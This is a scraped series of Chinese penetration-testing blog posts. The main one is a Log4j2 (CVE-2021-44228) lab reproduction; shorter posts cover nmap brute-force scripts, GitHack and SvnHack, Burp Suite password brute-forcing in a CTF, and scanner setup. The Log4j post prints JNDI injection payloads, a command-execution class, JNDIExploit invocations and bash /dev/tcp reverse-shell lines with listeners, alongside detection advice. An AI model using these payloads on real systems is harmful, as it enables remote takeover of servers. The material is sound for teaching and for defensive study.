日志记录工具，大量的业务框架都使用了该组件。如：Apache Struts2、Apache Solr、Apache Druid、Apache Flink等。此次漏洞是用于 Log4j2 提供的 lookup 功能造成的，该功能允许开发者通过一些协议去读取相应环境中的配置。但在实现的过程中，并未对输入进行严格的判断，从而造成漏洞的发生。 Apache Log4j2重写了Log4j框架，并引入了大量丰富的特性。可以控制日志信息输送的目的地为控制台、文件、GUI组件等。 漏洞编号CVE-2021-44228 CNVD-2021-95914 漏洞等级严重 影响范围Apache Log4j 2.x &lt; 2.15.0-rc2 漏洞摘要由于Apache Log4j2某些功能存在递归解析功能，未经身份验证的攻击者通过发送特别构造的数据请求包，可在目标服务器上执行任意代码，攻击者可直接构造恶意请求，触发远程代码执行漏洞。 当程序将用户输入的数据被日志记录时，可触发此漏洞。利用此漏洞可以在目标服务器上执行任意代码。 漏洞分析 对于信息泄露，泄露的数据如何利用。思路如下： 获取（获取数据）：利用$&#123;&#125;和其他各种Lookup 带出（回显带出数据）：利用dnslog或直接dns协议 执行流程 POC作为message传给Logger类的 error 、 fatal 等一些方法 略去一些非关键流程，会进入到MessagePatternConverter类format方法对$&#123;内容进行解析替换 进入到interpolotor类的lookup方法，由前缀值jndi获取到jndiLookup类 最终调用对应的lookup方法发起请求 流程分析MessagePatternConverter.format会先判断输入的字符串中是否包含$&#123;，存在的话会进入判断。该漏洞会将$&#123;&#125;中的内容当作表达式，从而进行远程加载。（将LDAP服务器上该地址中所记录的东西加载到本地，来进行字符串替换） 漏洞靶场1docker pull registry.cn-hangzhou.aliyuncs.com/fengxuan/log4j_vuln 1docker run -it -d -p 8080:8080 --name log4j_vuln_container registry.cn-hangzhou.aliyuncs.com/fengxuan/log4j_vuln 1docker exec -it log4j_vuln_container /bin/bash 1/bin/bash /home/apache-tomcat-8.5.45/bin/startup.sh 访问 http://127.0.0.1:8080/webstudy/ 就可以了， post的参数为c 漏洞复现 与fastjson的漏洞如出一辙，需要编写一个恶意类。 弹出计算器 12345678910111213141516public class Exploit &#123; public Exploit()&#123; try&#123; // 要执行的命令 String[] commands = &#123;&quot;open&quot;, &quot;/System/Applications/Calculator.app&quot;&#125;; Process pc = Runtime.getRuntime().exec(commands); pc.waitFor(); &#125; catch(Exception e)&#123; e.printStackTrace(); &#125; &#125; public static void main(String[] argv) &#123; Exploit e = new Exploit(); &#125;&#125; 构造payload 构造payload，post提交 1c=$&#123;jndi:ldap://log4j2.ua7wyw.dnslog.cn&#125; dnslog查看 查看java版本 1c=$&#123;jndi:ldap://$&#123;java:version&#125;.t0k805.dnslog.cn&#125; 利用$&#123;来查询java版本 执行命令 项目地址：https://github.com/WhiteHSBG/JNDIExploit 在本地先要生成JNDI链接并启动后端相关服务，注意防火墙开启相关端口，用的是https://github.com/WhiteHSBG/JNDIExploit/releases/download/v1.4/JNDIExploit.v1.4.zip 1java -jar /Users/gryffinbit/Documents/Tools/JNDIExploit1.4/JNDIExploit-1.4-SNAPSHOT.jar -i 192.168.0.89 一些坑： 刚开始运行jar的时候，状态是显示两个端口的监听，默认开启LDAP和http的端口。当后面POST请求的时候，成功利用了JNDI注入，会显示注入成功的一些提示信息 虽然是在本地启动的ldap服务，但是-i的ip不能写成127.0.0.1，要查询本地的ip，才可以 java -jar /Users/gryffinbit/Documents/Tools/JNDIExploit1.4/JNDIExploit-1.4-SNAPSHOT.jar -u 查看支持的 LDAP 格式。针对不同的网页框架和需求选择。 下面的例子，在post请求里构造cmd，利用JNDI成功注入，来获得回显，采用的LDAP是 ldap://0.0.0.0:1389/Basic/TomcatEcho 构造payload 网页处于http://127.0.0.1:8080/webstudy/ 代理开启burpsuite，开启抓包，点击hitme，将该数据包抓获 成功抓获数据包 将刚刚抓获的数据包，重放 修改数据包，将get改为POST，构造payload，成功执行命令 1234cmd:whoamiContent-Type: application/x-www-form-urlencodedc=$&#123;jndi:ldap://192.168.0.89:1389/TomcatBypass/TomcatEcho&#125; 成功回显 反弹 Shell 构造payload 1234cmd: bash -i &gt;&amp; /dev/tcp/10.211.55.2/5555 0&gt;&amp;1Content-Type: application/x-www-form-urlencodedc=$&#123;jndi:ldap://10.211.55.2:1389/Basic/TomcatEcho&#125; 服务器端开启监听 1ncat -lvnp 5555 在macOS上是ncat命令 在Linux上是nc命令 netcat有很多版本，不同操作系统下面的细节用法也不同，可以参考这篇文章：https://www.sqlsec.com/2019/10/nc.html#%E6%8C%81%E4%B9%85%E7%9B%91%E5%90%AC 可能攻击失败，这时候需要对payload进行编码 工具 使用 JNDI-Injection-Exploit 。 编码 对cmd base64编码（放进payload里的） 12bash -i &gt;&amp; /dev/tcp/192.168.0.89/7777 0&gt;&amp;1YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuODkvNzc3NyAwPiYx 目标机，主动对攻击机发起连接。攻击机收到目标机shell payload 1java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo, YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuODkvNzc3NyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A &quot;192.168.0.89&quot; -A 攻击机的IP 攻击机启动监听，获取shell 1ncat -lvnp 7777 burpsuite 重放，改成POST，参数注入选择JNDI-INJECT生成的payload 123Content-Type: application/x-www-form-urlencodedc=$&#123;jndi:ldap://192.168.0.89:1389/yltjam&#125; 攻击排查日志排查攻击者在利用前通常采用dnslog方式进行扫描、探测，对于常见利用方式可通过应用系统报错日志中的关键字进行排查 12345javax.naming.CommunicationExceptionjavax.naming.NamingException: problem generating object using object factoryError looking up JNDI resource 流量排查 排查日志或者解码后完整的请求数据包中是否存在$&#123;jndi:关键字。 排查日志是否存在相关堆栈报错，堆栈里是否有JndiLookup、ldapURLContext、getObjectFactoryFromReference等与 jndi 调用相关的堆栈信息。 JNDI是什么是什么 JNDI是 Java 命名与目录接口（Java Naming and Directory Interface） 来源 程序员开发的时候，需要开发能够访问mysql数据库的应用，于是将一个对mysql JDBC驱动程序类的引用进行了编码，并通过使用适当的JDBC URL连接到数据库 12345678910111213141516Connection conn=null; try &#123; Class.forName(&quot;com.mysql.jdbc.Driver&quot;, true, Thread.currentThread().getContextClassLoader()); conn=DriverManager.getConnection(&quot;jdbc:mysql://MyDBServer?user=qingfeng&amp;password=mingyue&quot;); /* 使用conn并进行SQL操作 */ ...... conn.close(); &#125;catch(Exception e) &#123; e.printStackTrace(); &#125; finally &#123; if(conn!=null) &#123; try &#123; conn.close(); &#125;catch(SQLException e) &#123;&#125; &#125; &lt;br&gt;&#125; 但由于数据库服务器名称、用户名、口令需要改变的时候，由此引发JDBC的URL也需要修改. 数据库可能不使用mysql了，引发JDBC驱动程序包和类名需要修改 随着开发的进行，原配置的连接池参数可能也需要调整。 1jdbc:mysql://MyDBServer?user=qingfeng&amp;password=mingyue&quot; 解决方案 程序员开发的时候不需要关心具体的数据库后台是什么，JDBC驱动程序是什么，JDBC URL格式是什么，访问数据库的用户名和口令是什么。即程序员编写的程序应该没有对JDBC驱动程序的引用，甚至没有数据库池或连接管理。应该把这些问题交给J2EE容器来配置和管理。程序员只需要对这些配置和管理进行引用即可。于是就有了JNDI JDNI是如何实际应用的 需要配置数据源，修改配置文件的内容，使之能通过JDBC正确访问到mysql数据库。配置文件定义了数据源，其参数包括JDBC的URL，驱动类名，用户密码等 1234567891011121314 1 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; 2 &lt;datasources&gt; 3 &lt;local-tx-datasource&gt; 4 &lt;jndi-name&gt;MySqlDS&lt;/jndi-name&gt; 5 &lt;connection-url&gt;jdbc:mysql://localhost:3306/lw&lt;/connection-url&gt; 6 &lt;driver-class&gt;com.mysql.jdbc.Driver&lt;/driver-class&gt; 7 &lt;user-name&gt;root&lt;/user-name&gt; 8 &lt;password&gt;rootpassword&lt;/password&gt; 9 &lt;exception-sorter-class-name&gt;org.jboss.resource.adapter.jdbc.vendor.MySQLExceptionSorter&lt;/exception-sorter-class-name&gt;10 &lt;metadata&gt;11 &lt;type-mapping&gt;mySQL&lt;/type-mapping&gt;12 &lt;/metadata&gt;13 &lt;/local-tx-datasource&gt;14 &lt;/datasources&gt; 开发的时候，在程序中引用数据源。程序不需要关心JDBC具体参数。 在系统部署后，如果数据库的相关参数更改，只需要重新配置mysql-ds.xml，修改其中的JDBC参数，只要保证数据源的名称不变，那么程序源代码就无需修改。 JNDI避免了程序与数据库之间的紧耦合，使应用更加易于配置、易于部署 JNDI的扩展 所有与系统外部的资源的引用，都可以通过JNDI定义和引用。 LDAP 是什么LDAP 轻量级目录访问协议。 LDAP目录服务是由目录数据库和一套访问协议组成的系统 经过简单的配置就可以与服务器做认证交互 目录服务 特殊的数据库，保存描述性、基于属性的详细信息，支持过滤功能 动态的，灵活的，易扩展 目录是一个为查询、浏览和搜索而优化的数据库，成树状结构组织数据，类似文件目录。有很好的读性能，用来查询。 LDAP数据库服务器 访问某些服务器，想要获取里面的数据，需要用到LDAP协议 统一身份认证主要是改变原有的认证策略，使需要认证的软件都通过LDAP进行认证，在统一身份认证之后，用户的所有信息都存储在AD Server中。终端用户在需要使用公司内部服务的时候，都需要通过AD服务器的认证。 JNDIExploit用于JNDI注入利用的工具。 JNDI注入 JNDI的应用场景：动态加载数据库配置文件，从而保持数据库代码不变动等，代码如下： 123String jndiName= ...;//指定需要查找name名称Context context = new InitialContext();//初始化默认环境DataSource ds = (DataSourse)context.lookup(jndiName);//查找该name的数据 这些对象可以存储在不同的命名或目录服务中，例如远程方法调用（RMI），通用对象请求代理体系结构（CORBA），轻型目录访问协议（LDAP）或域名服务（DNS）。 比如RMI： 12InitialContext var1 = new InitialContext();DataSource var2 = (DataSource)var1.lookup(&quot;rmi://127.0.0.1:1099/Exploit&quot;); JNDI注入就是当上文代码中jndiName这个变量可控时，引发的漏洞。它将导致远程class文件加载，从而导致远程代码执行。即&quot;rmi://127.0.0.1:1099/Exploit&quot;这个正常的数据查找，变成了加载某有害文件。 即 利用JNDI注入需要满足2个条件 需要服务端存在一下代码，使得URL可控 123String uri = &quot;rmi://127.0.0.1:1099/aa&quot;; Context ctx = new InitialContext(); ctx.lookup(uri); 存在漏洞版本的java环境 JNDI注入原理 JNDI注入由于其加载动态类原理是JNDI Reference远程加载Object Factory类的特性（使用的不是RMI Class Loading，而是 URL Class Loader LDAP+JNDI 绕过更多版本限制，实现注入LDAP 基于TCP&#x2F;IP协议 服务端存储数据，客户端与服务端连接进行操作 树形存储 POC 代码会根据传入协议头的区别去进入对应的处理函数，只需要修改传入参数的解析头，再启动LDAP服务，恶意class的web服务即可 参考文章https://mp.weixin.qq.com/s/W7kajN3GKKlK-C41N4re4g https://www.freebuf.com/vuls/310414.html https://xz.aliyun.com/t/10659 https://www.cnblogs.com/study-everyday/p/6723313.html https://www.cnblogs.com/wilburxu/p/9174353.html https://xz.aliyun.com/t/6633","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://gryffinbit.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"log4j2","slug":"log4j2","permalink":"https://gryffinbit.top/tags/log4j2/"}],"author":"Gryffinbit"},{"title":"Nemo macOS安装","slug":"Nemo-macOS安装","date":"2022-09-01T11:14:33.000Z","updated":"2024-08-27T02:28:08.000Z","comments":true,"path":"2022/09/01/Nemo-macOS安装/","permalink":"https://gryffinbit.top/2022/09/01/Nemo-macOS%E5%AE%89%E8%A3%85/","excerpt":"","text":"环境Nemo 版本：amd64 macOS 版本：Mac mini（M1，2020） 安装项目地址：https://github.com/hanc00l/nemo_go/ 下载安装包 amd64 解压到指定文件夹 1cd nemo rabbitmq安装配置 1234brew install rabbitmq# 配置rabbitmq：增加rabbitmq用户和密码sudo rabbitmqctl add_user nemo root123sudo rabbitmqctl set_permissions -p &quot;/&quot; nemo &quot;.*&quot; &quot;.*&quot; &quot;.*&quot;","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://gryffinbit.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"工具","slug":"渗透测试/工具","permalink":"https://gryffinbit.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"信息收集","slug":"信息收集","permalink":"https://gryffinbit.top/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"}],"author":"Gryffinbit"},{"title":"渗透测试信息收集","slug":"渗透测试信息收集","date":"2022-08-31T18:16:08.000Z","updated":"2024-11-12T07:00:06.000Z","comments":true,"path":"2022/09/01/渗透测试信息收集/","permalink":"https://gryffinbit.top/2022/09/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/","excerpt":"","text":"信息收集工具Nemo Nemo是用来进行自动化信息收集的一个简单平台，通过集成常用的信息收集工具和技术，实现对内网及互联网资产信息的自动收集。 集成了IP资产、域名资产、指纹信息、API接口 、Poc验证与目录扫描、分布式任务。这一套操作还是界面可视化的。 地址：https://github.com/hanc00l/nemo_go macOS 安装见blog：【待完成】 SiteScan 专注一站化解决渗透测试的信息收集任务，功能包括域名ip历史解析、nmap常见端口爆破、子域名信息收集、旁站信息收集、whois信息收集、网站架构分析、cms解析、备案信息收集、CDN信息解析、是否存在waf检测、后台寻找以及生成检测结果html报告表。 地址：https://github.com/kracer127/SiteScan 已知IP地址查对应的域名（IP反查域名）1nslookup ip地址 1host 123.125.66.120 网站工具： http://ip.yqie.com/iptodomain.aspx http://www.webscan.cc/ 已知域名查对应IP（域名反查IP） ping对应的域名 IP WHOIS查询 网站工具：https://tool.chinaz.com/ipwhois 资产识别参考资料https://www.freebuf.com/articles/network/179519.html https://www.freebuf.com/articles/network/179519.html","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://gryffinbit.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"信息收集","slug":"渗透测试/信息收集","permalink":"https://gryffinbit.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"}],"tags":[{"name":"信息收集","slug":"信息收集","permalink":"https://gryffinbit.top/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"}],"author":"Gryffinbit"},{"title":"Goby扫描器用法","slug":"Goby扫描器用法","date":"2022-08-29T17:07:05.000Z","updated":"2024-11-12T06:59:42.000Z","comments":true,"path":"2022/08/30/Goby扫描器用法/","permalink":"https://gryffinbit.top/2022/08/30/Goby%E6%89%AB%E6%8F%8F%E5%99%A8%E7%94%A8%E6%B3%95/","excerpt":"","text":"介绍Goby目前是使用Go语言开发、采用Electron+VUE前端框架的绿色版本，支持windows&#x2F;MacOS&#x2F;Linux 环境macOS: macOS Monterey. M1, 2020, ARM64 下载地址https://gobysec.net/#dl 配置设置网卡权限 12cd /devsudo chown $USER:admin bp* # $USER 需要改为电脑用户名 功能 资产收集 自动检测当前网络空间存活的IP及解析域名到IP，并且可以分析出端口对应的协议、Mac地址、证书、应用产品、厂商等。 子域名扫描 自动爬取子域名，AXFR监测，二级域名字典爆破，关联域名查询。同时支持连接FOFA，扩大数据源。 网站截图 通过截图，快速判断网站系统应用，无须再一一打开。 注：该功能基于Chrome截图插件实现，需要预安装Chrome浏览器。 深度分析 发现非标准端口或非标准应用系统资产，进行深入的应用识别。在实战场景中非常有效。 代理扫描 通过socket5代理，快速进入内网，开启内网渗透。 注：支持Pcap及socket两种模式，请根据不同的场合动态切换。 pcap模式：支持协议识别和漏洞扫描，不支持端口扫描； socket模式：支持端口扫描协议识别以及漏洞扫描，扫描速度慢。 漏洞利用 对扫描出来的风险资产进行批量验证，验证成功后，可进行利用，利用成功后，不需要自己搭建服务器，直接进行shell管理。 支持自定义PoC及弱口令字典，让安全人员自定义属于自己的武器库，增强攻击力。 生成报告扫描完成后，生成分析报告，并支持PDF、Excel导出，方便本地分析及呈报传阅。 CS模式远程服务，区分扫描模块及展示模块。 CS搭建：开启远端服务，然后配置服务端主机、端口、账户信息。 参考文章https://www.freebuf.com/sectool/232007.html","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://gryffinbit.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"信息收集","slug":"渗透测试/信息收集","permalink":"https://gryffinbit.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"}],"tags":[{"name":"Goby","slug":"Goby","permalink":"https://gryffinbit.top/tags/Goby/"}],"author":"Gryffinbit"},{"title":"历史漏洞查询","slug":"历史漏洞查询","date":"2022-08-29T16:33:19.000Z","updated":"2024-08-27T02:28:09.000Z","comments":true,"path":"2022/08/30/历史漏洞查询/","permalink":"https://gryffinbit.top/2022/08/30/%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%9F%A5%E8%AF%A2/","excerpt":"","text":"漏洞库 美国著名安全公司Offensive Security的漏洞库https://www.exploit-db.com/ 阿里云漏洞库 https://avd.aliyun.com/nvd/list tenable漏洞库(nessus) https://www.tenable.com/cve/search CNNVD（国家信息安全漏洞库）：http://www.cnnvd.org.cn/ CNVD（国家信息安全漏洞共享平台）：https://www.cnvd.org.cn/ 绿盟漏洞库：http://www.nsfocus.net/index.php?act=sec_bug 0day漏洞库：http://0day5.com/. (2017年后不再更新了) 美国国家工控系统行业漏洞库：https://ics-cert.us-cert.gov/advisories 中国国家工控系统行业漏洞：http://ics.cnvd.org.cn/ 美国国家信息安全漏洞库 ：https://nvd.nist.gov/ CVE(美国国土安全资助的MITRE公司负责维护) ：https://cve.mitre.org/cve/search_cve_list.html 渗透测试其他工具 看云全套渗透流程：https://www.kancloud.cn/wepeng/stcs/400558 一个导航，东西很全面 ：https://i.zkaq.cn/ 知道创宇技能表：https://blog.knownsec.com/Knownsec_RD_Checklist/index.html 漏洞复现https://www.horizon3.ai/category/blog/red-team/","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://gryffinbit.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"信息收集","slug":"渗透测试/信息收集","permalink":"https://gryffinbit.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"}],"tags":[],"author":"Gryffinbit"},{"title":"nmap常见扫描方法和参数，以及常见端口信息","slug":"nmap常见扫描方法和参数，以及常见端口信息","date":"2022-08-26T17:28:54.000Z","updated":"2024-11-12T06:59:25.000Z","comments":true,"path":"2022/08/27/nmap常见扫描方法和参数，以及常见端口信息/","permalink":"https://gryffinbit.top/2022/08/27/nmap%E5%B8%B8%E8%A7%81%E6%89%AB%E6%8F%8F%E6%96%B9%E6%B3%95%E5%92%8C%E5%8F%82%E6%95%B0%EF%BC%8C%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3%E4%BF%A1%E6%81%AF/","excerpt":"","text":"Nmap使用参数 官方参考：https://nmap.org/man/zh/man-port-scanning-techniques.html 123456789101112131415161718192021222324252627-sL：列出需要扫描的目标，不检测存活状态-sn：只ping扫描，不做端口扫描，检查存活状态-Pn：跳过主机发现，视所有主机都在线-sS：TCP端口扫描，半连接扫描，只发送SYN报文，不易被注意-sP：Ping扫描-sT：TCP端口扫描，建立tcp连接-sU：UDP端口扫描-PR：ARP Ping，可以找到MAC地址-p：只扫描指定端口-n：不用域名解析。比较快-sV：开启端口服务的版本检测-A: 操作系统信息和端口服务版本探测-v：详细输出扫描情况-O：操作系统识别-sF: 探测防火墙状态 常用方法 扫描多个文件空格分开 1nmap 192.168.0.100 192.168.0.105 扫描一个范围内的 1nmap 192.168.0.100-110 扫描一个网段 1nmap 192.168.0.0/24 扫描一个列表中的所有目标地址 1nmap -iL targets.txt 扫描除一个目标外所有地址 1nmap 192.168.0.0/24 -exclude 192.168.109.105 扫描除一个文件外的所有地址 1nmap 192.168.0.0/24 -excludefile targets.txt 扫描特定端口，逗号分隔 1nmap 192.168.0.100 -p 21,22,23,80 对目标地址进行路由跟踪 1nmap -traceroute 192.168.0.105 探测防火墙状态 1nmap -sF -T4 192.168.0.105 利用FIN扫描，收到RST说明该端口关闭防火墙 脚本使用 进行弱口令探测 鉴权 1nmap --script=auth 192.168.0.105 爆破 可对数据库、SMB、SNMP等进行简单密码的暴力猜解 1nmap --script=brute 192.168.0.105 smb破解： 123456# 脚本nmap --script=smb-brute.nse IP# 字典nmap --script=smb-brute.nse --script-args=userdb=/var/passwd,passdb=/var/passwd ip# 漏洞nmap --script=smb-check-vulns.nse --script-args=unsafe=1 ip mysql扫描： 1234# root空口令nmap -p3306 --script=mysql-empty-password.nse ip# 列出mysql用户nmap -p3306 --script=mysql-users.nse --script-args=mysqluser=root ip Oracle扫描： 12# sid 扫描nmap --script=oracle-sid-brute -p 1521-1560 ip 漏洞扫描 检查目标主机或网段是否存在常见的漏洞 1nmap --script=vuln 192.168.0.105 应用服务 nmap具备很多常见应用服务的扫描脚本，例如VNC服务、MySQL服务、Telnet服务、Rsync服务等，以VNC服务为例 1nmap --script=realvnc-auth-bypass 192.168.0.105 探测局域网内更多服务的开启情况 1nmap -n -p 445 --script=broadcast 192.168.0.105 whois解析 利用第三方的数据库或资源查询目标地址的信息，例如进行whois解析 1nmap -script external baidu.com ​ 常见端口号 端口号 协议&#x2F;用途 20 FTP 数据端口 21 FTP文件传输协议端口 22 SSH服务 23 Telnet 服务 25 简单邮件传输协议（SMTP） 53 域名服务 67 DHCP、动态主机配置协议 80 http 88 Kerberos 网络验证系统 110 POP3邮局协议 113 验证和身份识别协议 115 sftp，SFTP安全文件传输协议 443 https 安全超文本传输协议 520 RIP 路由信息协议 992 telnets，通过安全套接字层的 Telnet 995 pop3s，通过安全套接字层的邮局协议版本3 1080 Socks代理服务端口 1755 微软媒体服务器，简称MMS 1521 Oracle 数据库 8080 Oracle XDB（ XML 数据库） 3389 Windows远程桌面 7001 WebLogic 8080 Tomcat 3306 MySQL 数据库服务 445 IPC服务默认端口，在局域网中轻松访问各种共享文件夹或共享打印机。永恒之蓝 参考文章https://blog.51cto.com/binghe001/5246901","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://gryffinbit.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"信息收集","slug":"渗透测试/信息收集","permalink":"https://gryffinbit.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"}],"tags":[{"name":"nmap","slug":"nmap","permalink":"https://gryffinbit.top/tags/nmap/"}],"author":"Gryffinbit"},{"title":"svnhack原理及应用","slug":"svnhack原理及应用","date":"2022-08-24T18:16:12.000Z","updated":"2024-11-12T06:59:12.000Z","comments":true,"path":"2022/08/25/svnhack原理及应用/","permalink":"https://gryffinbit.top/2022/08/25/svnhack%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/","excerpt":"","text":"环境配置Kali Linux 2021.3 ARM64 安装选择自己喜欢的安装路径 1cd /root/Documents/Tools 1git clone https://github.com/callmefeifei/SvnHack 注意python要使用python2版本的 12cd SvnHackpython2 SvnHack.py -u http://trafficbonus.com/.svn/entries 参数123456# 列取指定目录-d 目录名# 读取指定代码-r index.php# 下载整贴--download 参考文章https://www.cnblogs.com/Lmg66/p/13598803.html","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://gryffinbit.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"工具","slug":"渗透测试/工具","permalink":"https://gryffinbit.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"svnhack","slug":"svnhack","permalink":"https://gryffinbit.top/tags/svnhack/"}],"author":"Gryffinbit"},{"title":"githack原理及应用（网鼎杯comment题）","slug":"githack原理及应用","date":"2022-08-24T18:14:34.000Z","updated":"2024-11-12T06:59:44.000Z","comments":true,"path":"2022/08/25/githack原理及应用/","permalink":"https://gryffinbit.top/2022/08/25/githack%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/","excerpt":"","text":"环境配置Kali Linux 2021.3 ARM64 安装选择自己喜欢的安装路径 1cd /root/Documents/Tools 1git clone https://github.com/BugScanTeam/GitHack 注意python要使用python2版本的 12cd GitHackpython2 GitHack.py http://challenge-11233494fe689bdd.sandbox.ctfhub.com:10080/.git 一道CTF练习题 网鼎杯comment，buuctf靶场地址：https://buuoj.cn/challenges#[%E7%BD%91%E9%BC%8E%E6%9D%AF%202018]Comment 需要爆破登陆 是一个发帖的网页，需要登陆，才可以顺利发帖 使用burpsuite对登陆密码进行爆破。设置代理，分别对浏览器和burpsuite进行设置 浏览器代理： burpsuite开启监听 在登录框页面，随便输入用户密码，burpsuite会拦截数据包 在该界面空白处右键，选择 send to intruder （inturder可用于对密码进行自动化爆破） Intruder是可定制的、高度可配的工具，常用于对web应用程序进行自动化攻击，基本流程为设置代理并开启拦截请求，将拦截到的数据包发送到Intruder模块，添加需要攻击的参数，设置参数字典，开始攻击。 点击intruder页面 将自动设置的position，点右边菜单栏add下面的clear清除掉，然后在请求中的password，在zhangwei后面的位置点击Add，设置攻击类型为Cluster bomb（因为只需要爆破后三位就可以） 设置payloads，选择爆破方式，指定爆破长度范围，只需要三位 点击start attack开始爆破，专业版设置多线程。2022年的bp在资源池 resource pool 中设置最大线程数 爆破成功，找到长度不同的那个Length&#x3D;2024，状态码显示的302，代表重定向了。 登陆成功 f12控制台有提示，所以跟git有关 目录爆破 kali dirsearch 1dirsearch -u http://3daaffa8-f7e3-49bc-8a4d-f287334a2e82.node4.buuoj.cn:81 -t 120 -o /root/report.txt 1scp report.txt gryffinbit@10.211.55.2:/Users/gryffinbit 上传到Mac上，用sublime比较方便好看 githack 找到了git文件使用kali，githack，将git下载到本地 12cd Documents/Tools/GitHackpython2 GitHack.py http://3daaffa8-f7e3-49bc-8a4d-f287334a2e82.node4.buuoj.cn:81/.git 找到刚刚的文件 1cd /root/Documents/Tools/GitHack/dist/3daaffa8-f7e3-49bc-8a4d-f287334a2e82.node4.buuoj.cn_81/.git Git 查看 1git log --all 版本回退 可以看到git有三次提交，回退到最初版本，获得添加的这个write_do.php 1git reset --hard e5b2a2443c2b6d395d06960123142bc91123148c 查看write_do.php 可判断存在二次注入 参考文章https://www.bilibili.com/read/cv8054287/ https://zhuanlan.zhihu.com/p/425190294","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://gryffinbit.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"工具","slug":"渗透测试/工具","permalink":"https://gryffinbit.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"githack","slug":"githack","permalink":"https://gryffinbit.top/tags/githack/"}],"author":"Gryffinbit"},{"title":"目录扫描：敏感信息，以及常见状态码","slug":"目录扫描：敏感信息，以及常见状态码","date":"2022-08-24T14:50:16.000Z","updated":"2024-08-27T02:28:10.000Z","comments":true,"path":"2022/08/24/目录扫描：敏感信息，以及常见状态码/","permalink":"https://gryffinbit.top/2022/08/24/%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%EF%BC%9A%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%EF%BC%8C%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E7%8A%B6%E6%80%81%E7%A0%81/","excerpt":"","text":"前言githack使用跳转Blog：https://gryffinbit.top/2022/08/24/githack%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/ svnhack使用跳转Blog：https://gryffinbit.top/2022/08/24/svnhack%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/ 敏感信息robots.txt是什么： robots.txt是一个纯文本文件，在这个文件中网站管理者可以声明该网站中不想被搜索引擎访问的部分，或者指定搜索引擎只收录指定的内容。当一个搜索引擎（又称搜索机器人或蜘蛛程序）访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，那么搜索机器人就沿着链接抓取。 作用： 引导搜索引擎蜘蛛抓取指定栏目或内容 网站改版或者URL重写优化时候屏蔽对搜索引擎的不友好的链接 屏蔽死链接、404错误页 屏蔽无内容、无价值页面 屏蔽重复页面，如评论页、搜索结果页 引导蜘蛛抓取网站地图 crossdomain.xml是什么 跨域，顾名思义就是需要的资源不在自己的域服务器上，需要访问其他域服务器。跨域策略文件是一个xml文档文件，主要是为web客户端(如Adobe Flash Player等)设置跨域处理数据的权限。 作用 打个比方说，公司A部门有一台公共的电脑，里面存放着一些资料文件，专门供A部门内成员自己使用，这样，A部门内的员工就可以访问该电脑，其他部门人员则不允许访问。A部门的员工可以任意访问A部门的公共电脑，但是不能直接访问B部门的公共电脑。有一天，B部门领导觉得他们的资料非常有用，想要与A部门分享，于是就给A部门一个令牌，这样A部门的员工也可以访问B部门的公共电脑了。A部门可访问B部门设置访问权限，这个权限设置就是跨域策略文件crossdomain.xml存在的意义。 sitemap.xml是什么 Sitemap 可方便网站管理员通知搜索引擎他们网站上有哪些可供抓取的网页。最简单的 Sitemap 形式，就是XML 文件 作用 